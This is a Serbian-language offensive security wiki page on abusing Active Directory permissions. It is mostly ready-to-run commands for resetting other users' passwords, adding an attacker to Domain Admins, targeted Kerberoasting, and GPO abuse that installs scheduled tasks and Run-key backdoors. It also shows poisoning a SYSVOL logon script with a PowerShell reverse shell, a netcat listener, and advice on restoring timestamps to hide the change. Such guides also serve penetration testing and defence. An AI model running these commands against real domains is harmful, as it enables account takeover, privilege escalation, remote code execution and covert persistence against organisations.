# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ova stranica je uglavnom sažetak tehnika iz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Za više detalja, pogledajte originalne članke.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Ova privilegija daje napadaču potpunu kontrolu nad ciljnim korisničkim nalogom. Kada se `GenericAll` prava potvrde korišćenjem komande `Get-ObjectAcl`, napadač može:

- **Promeniti lozinku cilja**: Korišćenjem `net user <username> <password> /domain`, napadač može resetovati korisničku lozinku.
- Sa Linuxa, isto se može uraditi preko SAMR-a koristeći Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Ako je nalog onemogućen, uklonite UAC oznaku**: `GenericAll` omogućava uređivanje `userAccountControl`. Sa Linuxa, BloodyAD može ukloniti `ACCOUNTDISABLE` zastavicu:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Dodelite SPN korisničkom nalogu da bude kerberoastable, zatim koristite Rubeus i targetedKerberoast.py da izvučete i pokušate da crack-ujete ticket-granting ticket (TGT) hashes.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Ciljani ASREPRoasting**: Onemogućite pre-authentication za korisnika, čime korisnički nalog postaje ranjiv na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Sa `GenericAll` na korisniku možete dodati kredencijal zasnovan na sertifikatu i autentifikovati se kao tog korisnika bez menjanja njegove lozinke. Vidi:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll prava nad grupom**

Ova privilegija omogućava napadaču da menja članstva u grupi ako ima `GenericAll` prava na grupu kao što je `Domain Admins`. Nakon identifikovanja distinguished name grupe pomoću `Get-NetGroup`, napadač može:

- **Dodavanje sebe u Domain Admins Group**: Ovo se može uraditi putem direktnih komandi ili korišćenjem modula kao što su Active Directory ili PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Sa Linuxa takođe možete iskoristiti BloodyAD da sebe dodate u proizvoljne grupe kada nad njima imate GenericAll/Write membership. Ako je ciljana grupa ugnježdena u “Remote Management Users”, odmah ćete dobiti WinRM pristup na hostovima koji poštuju tu grupu:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Posedovanje ovih privilegija na objektu računara ili korisničkom nalogu omogućava:

- **Kerberos Resource-based Constrained Delegation**: Omogućava preuzimanje kontrole nad objektom računara.
- **Shadow Credentials**: Upotrebite ovu tehniku za lažno predstavljanje računara ili korisničkog naloga iskorišćavanjem privilegija za kreiranje shadow credentials.

## **WriteProperty on Group**

Ako korisnik ima `WriteProperty` prava na svim objektima za određenu grupu (npr. `Domain Admins`), može:

- **Dodavanje sebe u Domain Admins grupu**: Moguće kombinovanjem `net user` i `Add-NetGroupUser` komandi; ova metoda omogućava eskalaciju privilegija unutar domena.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ova privilegija omogućava napadačima da dodaju sebe u određene grupe, poput `Domain Admins`, putem komandi koje direktno manipulišu članstvom u grupi. Korišćenjem sledeće sekvence komandi moguće je dodati sebe:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Samo-članstvo)**

Ovaj sličan privilegij omogućava napadačima da sebe direktno dodaju u grupe promenom svojstava grupe ako imaju `WriteProperty` dozvolu na tim grupama. Potvrda i izvršenje ovog privilegija se vrše pomoću:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posedovanje `ExtendedRight` nad korisnikom za `User-Force-Change-Password` omogućava resetovanje lozinke bez poznavanja trenutne lozinke. Provera ovog prava i njegovo iskorišćavanje mogu se izvršiti putem PowerShell ili alternativnih komandno-linijskih alata, nudeći nekoliko metoda za resetovanje korisničke lozinke, uključujući interaktivne sesije i one-liners za neinteraktivna okruženja. Komande variraju od jednostavnih PowerShell poziva do korišćenja `rpcclient` na Linux, pokazujući svestranost vektora napada.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Ako napadač otkrije da ima `WriteOwner` prava nad grupom, može promeniti vlasništvo grupe na sebe. Ovo je posebno značajno kada je u pitanju grupa `Domain Admins`, jer promena vlasništva omogućava širu kontrolu nad atributima grupe i članstvom. Proces podrazumeva identifikovanje odgovarajućeg objekta pomoću `Get-ObjectAcl`, a zatim korišćenje `Set-DomainObjectOwner` da se izmeni vlasnik, bilo po SID-u ili po imenu.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Ovo dopuštenje omogućava napadaču da menja svojstva korisnika. Tačnije, uz pristup `GenericWrite`, napadač može promeniti putanju logon skripte korisnika tako da se zlonamerni skript izvrši prilikom prijave korisnika. Ovo se postiže korišćenjem komande `Set-ADObject` da se ažurira `scriptpath` svojstvo ciljnog korisnika tako da pokazuje na napadačev skript.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Sa ovom privilegijom, napadači mogu menjati članstvo u grupi, npr. dodavanjem sebe ili drugih korisnika u određene grupe. Ovaj proces uključuje kreiranje objekta kredencijala, korišćenje istog za dodavanje ili uklanjanje korisnika iz grupe i proveru promena članstva pomoću PowerShell komandi.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Sa Linuxa, Samba `net` može da doda/ukloni članove kada imate `GenericWrite` na grupi (korisno kada PowerShell/RSAT nisu dostupni):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Imanje AD objekta i privilegija `WriteDACL` na njemu omogućava napadaču da sebi dodeli privilegije `GenericAll` nad objektom. To se postiže manipulacijom ADSI-jem, što omogućava punu kontrolu nad objektom i mogućnost izmene njegovih članstava u grupama. Ipak, postoje ograničenja pri pokušaju iskorišćavanja ovih privilegija korišćenjem `Set-Acl` / `Get-Acl` cmdleta iz Active Directory modula.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner brzo preuzimanje kontrole (PowerView)

Kada imate `WriteOwner` i `WriteDacl` nad korisničkim ili servisnim nalogom, možete preuzeti potpunu kontrolu i resetovati njegovu lozinku koristeći PowerView bez poznavanja stare lozinke:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Napomene:
- Možda ćete prvo morati da postavite sebe za vlasnika ako imate samo `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Proverite pristup koristeći bilo koji protokol (SMB/LDAP/RDP/WinRM) nakon resetovanja lozinke.

## **Replikacija na domenu (DCSync)**

Napad DCSync koristi specifične dozvole za replikaciju na domeni da bi imitirao Domain Controller i sinhronizovao podatke, uključujući korisničke akreditive. Ova moćna tehnika zahteva dozvole kao što su `DS-Replication-Get-Changes`, što napadačima omogućava da izvuku osetljive informacije iz AD okruženja bez direktnog pristupa Domain Controlleru. [**Saznajte više o DCSync napadu ovde.**](../dcsync.md)

## Delegiranje GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegiranje GPO

Delegiran pristup za upravljanje Group Policy Objects (GPOs) može predstavljati značajan sigurnosni rizik. Na primer, ako korisniku kao što je `offense\spotless` budu dodeljena prava za upravljanje GPO-ima, oni mogu imati privilegije kao što su **WriteProperty**, **WriteDacl**, i **WriteOwner**. Ove dozvole mogu se zloupotrebiti u zlonamerne svrhe, što se može utvrditi pomoću PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumeracija GPO dozvola

Da biste identifikovali pogrešno konfigurisane GPO-ove, PowerSploit-ovi cmdleti se mogu povezati. Ovo omogućava otkrivanje GPO-ova kojima određeni korisnik ima prava za upravljanje: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Računari na koje je primenjena određena politika**: Moguće je utvrditi na koje računare se konkretan GPO primenjuje, što pomaže pri razumevanju obima potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politike primenjene na određeni računar**: Da biste videli koje su politike primenjene na određeni računar, mogu se koristiti komande kao što je `Get-DomainGPO`.

**OU-ovi na koje je primenjena određena politika**: Identifikovanje organizacionih jedinica (OUs) na koje utiče određena politika može se izvršiti pomoću `Get-DomainOU`.

Možete takođe koristiti alat [**GPOHound**](https://github.com/cogiceo/GPOHound) za enumeraciju GPO-ova i pronalaženje problema u njima.

### Zloupotreba GPO - New-GPOImmediateTask

Pogrešno konfigurisani GPO-ovi mogu se iskoristiti za izvršavanje koda, na primer kreiranjem trenutnog zakazanog zadatka. Ovo se može koristiti za dodavanje korisnika u lokalnu grupu administratora na pogođenim mašinama, značajno podižući privilegije:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, ako je instaliran, omogućava kreiranje i povezivanje novih GPOs, kao i podešavanje postavki, kao što su registry values, za izvršavanje backdoors na pogođenim računarima. Ova metoda zahteva da se GPO ažurira i da se korisnik prijavi na računar radi izvršenja:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse nudi način za zloupotrebu postojećih GPOs dodavanjem zadataka ili izmenom podešavanja bez potrebe za kreiranjem novih GPOs. Ovaj alat zahteva izmenu postojećih GPOs ili korišćenje RSAT alata za kreiranje novih pre primene izmena:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Prisilno ažuriranje politike

Ažuriranja GPO obično se odvijaju otprilike na svakih 90 minuta. Da bi se ubrzao ovaj proces, naročito nakon unošenja izmene, na ciljnom računaru se može pokrenuti komanda `gpupdate /force` da se prisili trenutno ažuriranje politike. Ova komanda osigurava da se sve izmene u GPO primene bez čekanja narednog automatskog ciklusa ažuriranja.

### Iza kulisa

Prilikom pregleda zakazanih zadataka za dati GPO, kao što je `Misconfigured Policy`, može se potvrditi dodavanje zadataka kao što je `evilTask`. Ovi zadaci se kreiraju putem skripti ili alata komandne linije s ciljem izmene ponašanja sistema ili eskalacije privilegija.

Struktura zadatka, prikazana u XML konfiguracionom fajlu generisanom komandnom `New-GPOImmediateTask`, opisuje detalje zakazanog zadatka — uključujući komandu koja će se izvršiti i njegove okidače. Ovaj fajl predstavlja način na koji su zakazani zadaci definisani i upravljani unutar GPO, pružajući metodu za izvršavanje proizvoljnih komandi ili skripti kao deo sprovođenja politike.

### Users and Groups

GPO takođe omogućavaju manipulaciju članstvom korisnika i grupa na ciljnim sistemima. Direktnim izmenama policy fajlova Users and Groups, napadači mogu dodavati korisnike u privilegovane grupe, poput lokalne `administrators` grupe. To je moguće putem delegiranja dozvola za upravljanje GPO, što omogućava izmene policy fajlova kako bi se ubacili novi korisnici ili promenilo članstvo u grupama.

XML konfiguracioni fajl za Users and Groups ilustruje kako se ove izmene primenjuju. Dodavanjem unosa u taj fajl, određenim korisnicima mogu se dodeliti povišene privilegije na pogođenim sistemima. Ova metoda nudi direktan pristup eskalaciji privilegija kroz manipulaciju GPO.

Pored toga, mogu se razmotriti i dodatne metode za izvršavanje koda ili održavanje persistencije, poput korišćenja logon/logoff skripti, izmene registry ključeva za autorun, instaliranja softvera preko .msi fajlova, ili uređivanja konfiguracija servisa. Ove tehnike pružaju različite puteve za održavanje pristupa i kontrolu ciljanih sistema kroz zloupotrebu GPO.

## SYSVOL/NETLOGON Logon Script Poisoning

Upisivi putevi pod `\\<dc>\SYSVOL\<domain>\scripts\` ili `\\<dc>\NETLOGON\` dozvoljavaju manipulisanje logon skriptama koje se izvršavaju pri prijavi korisnika preko GPO. To dovodi do izvršavanja koda u bezbednosnom kontekstu prijavljujućih se korisnika.

### Pronalaženje logon skripti
- Pregledajte atribute korisnika radi konfigurisanog logon skripta:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Pretražite deljene resurse domena kako biste otkrili prečice ili reference na skripte:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Parsirati `.lnk` datoteke da razreše ciljeve koji upućuju na SYSVOL/NETLOGON (koristan DFIR trik i za napadače bez direktnog pristupa GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound prikazuje atribut `logonScript` (scriptPath) na korisničkim čvorovima kada je prisutan.

### Proverite pristup za pisanje (ne verujte listama deljenja)
Automatizovani alati mogu prikazati SYSVOL/NETLOGON kao samo za čitanje, ali osnovne NTFS ACLs i dalje mogu dozvoljavati upis. Uvek testirajte:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Ako se veličina fajla ili mtime promeni, imate write. Sačuvajte originalne fajlove pre izmena.

### Zatrovati VBScript logon skriptu za RCE
Dodajte komandu koja pokreće PowerShell reverse shell (generišite sa revshells.com) i zadržite originalnu logiku kako biste izbegli prekid poslovne funkcije:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Osluškujte na svom hostu i sačekajte sledeći interactive logon:
```bash
rlwrap -cAr nc -lnvp 443
```
Napomene:
- Izvršavanje se dešava pod tokenom prijavljenog korisnika (ne SYSTEM). Opseg primene je GPO link (OU, site, domain) koji primenjuje taj skript.
- Očistite tako što ćete vratiti originalni sadržaj i vremenske oznake (timestamps) nakon upotrebe.


## Reference

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
